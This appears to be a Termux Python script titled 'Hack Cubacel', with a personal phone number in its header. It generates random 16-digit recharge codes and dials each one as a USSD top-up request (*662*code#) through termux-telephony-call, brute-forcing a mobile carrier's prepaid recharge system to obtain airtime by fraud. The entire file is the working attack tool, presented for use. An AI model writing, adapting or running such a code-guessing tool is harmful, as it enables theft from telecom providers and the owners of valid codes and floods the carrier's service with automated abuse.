# Created by JuanK
# Cell: +5358558319

import subprocess
import time
import random
import sys

from termcolor import colored

print ("")
print (colored("  _    _            _       _____      _                    _  ", "light_red"))
print (colored(" | |  | |          | |     / ____|    | |                  | | ", "light_red"))
print (colored(" | |__| | __ _  ___| | __ | |    _   _| |__   __ _  ___ ___| | ", "light_red"))
print (colored(" |  __  |/ _` |/ __| |/ / | |   | | | | '_ \ / _` |/ __/ _ \ | ", "light_blue"))
print (colored(" | |  | | (_| | (__|   <  | |___| |_| | |_) | (_| | (_|  __/ | ", "light_blue"))
print (colored(" |_|  |_|\__,_|\___|_|\_\  \_____\__,_|_.__/ \__,_|\___\___|_| ", "light_blue"))
print (colored("                                              Created by JuanK ", "light_red"))
print ("")

def sprint(texto, segundo=0.05):
    for linea in texto + '\n':
        sys.stdout.write(linea)
        sys.stdout.flush()
        time.sleep(segundo)

codes = int(input(colored("[+] ¿Cuántos códigos desea generar?: ", "light_green")))

if input(colored("[+] ¿Desea ingresar segundos entre códigos? (y/n): ", "light_green")).lower() == "y":
   seg = int(input(colored("[+] ¿Cuántos segundos desea ingresar entre códigos: ", "light_green")))
else:
   seg = 0

sprint(colored("\nGenerando códigos de recarga...", "light_green"))
sprint(colored("CTRL + C to exit...\n", "light_green"))

i = 0
n = 1
while i < codes:
    time.sleep(seg)
    num = str(random.randint(10**15, 10**16-1))
    result = '-'.join([num[i:i+4] for i in range(0, len(num), 4)])
    print (colored("[" + str(f"{n:02}") + "]: ", "dark_grey") + colored(str(result), "light_cyan"))
    subprocess.call(["termux-telephony-call", "*662*" + str(num) + "#"], shell=False)
    i += 1
    n += 1
sprint (colored("\nThanks for using ;)\n", "light_green"))
